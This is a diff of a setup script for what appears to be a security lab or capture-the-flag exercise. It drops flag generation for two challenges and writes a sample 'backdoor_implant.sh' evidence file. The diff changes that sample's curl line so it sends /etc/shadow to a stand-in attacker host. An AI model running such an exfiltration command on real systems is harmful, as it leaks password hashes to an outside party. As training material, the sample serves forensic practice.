@@ -44,16 +44,9 @@ export DEBIAN_FRONTEND=noninteractive
 apt-get update -y
 apt-get install -y --no-install-recommends yara jq
 
-# 3. Provision Dynamic Cryptographic Flags for Challenges 1 & 2
-echo "[FLAG] Generating unique cryptographic challenge flags..."
-FLAG1_HEX=$(openssl rand -hex 6 2>/dev/null || head -c 6 /dev/urandom | xxd -p 2>/dev/null || echo "a1b2c3d4e5f6")
-FLAG2_HEX=$(openssl rand -hex 6 2>/dev/null || head -c 6 /dev/urandom | xxd -p 2>/dev/null || echo "f6e5d4c3b2a1")
-
-DYNAMIC_FLAG1="FLAG{proc_harvest_${FLAG1_HEX}}"
-DYNAMIC_FLAG2="FLAG{dckr_sock_breakout_${FLAG2_HEX}}"
-
-echo "${DYNAMIC_FLAG2}" > /root/host_flag.txt
-chmod 600 /root/host_flag.txt
+# 3. Clean up any residual flags from earlier scenarios
+echo "[CLEANUP] Removing residual flags from previous scenarios..."
+rm -f /root/host_flag.txt /root/flag*.txt /tmp/flag*.txt 2>/dev/null || true
 
 # 4. Synchronize assets and evidence directories
 echo "[ASSETS] Preparing scenario paths..."
@@ -146,7 +139,7 @@ if [ ! -f "/evidence/backdoor_implant.sh" ]; then
         cat << 'EOF' > /evidence/backdoor_implant.sh
 #!/bin/sh
 # Malicious Exfiltration Hook
-curl -X POST -d @/root/host_flag.txt http://evil-c2.attacker.internal/exfil
+curl -X POST -d @/etc/shadow http://evil-c2.attacker.internal/exfil
 EOF
     fi
 fi
@@ -156,8 +149,8 @@ cp -u /evidence/backdoor_implant.sh /assets/evidence/backdoor_implant.sh 2>/dev/
 # Symlink /root/assets and /assets for consistent resolution
 ln -sfn /assets /root/assets 2>/dev/null || true
 
-# Synchronize verification scripts to /step1/, /step2/, /step3/, /step4/
-for i in 1 2 3 4; do
+# Synchronize verification scripts for Challenge 3 and Challenge 4
+for i in 3 4; do
     mkdir -p "/step${i}"
     if [ -f "${SCRIPT_DIR}/step${i}/verify.sh" ]; then
         cp "${SCRIPT_DIR}/step${i}/verify.sh" "/step${i}/verify.sh"
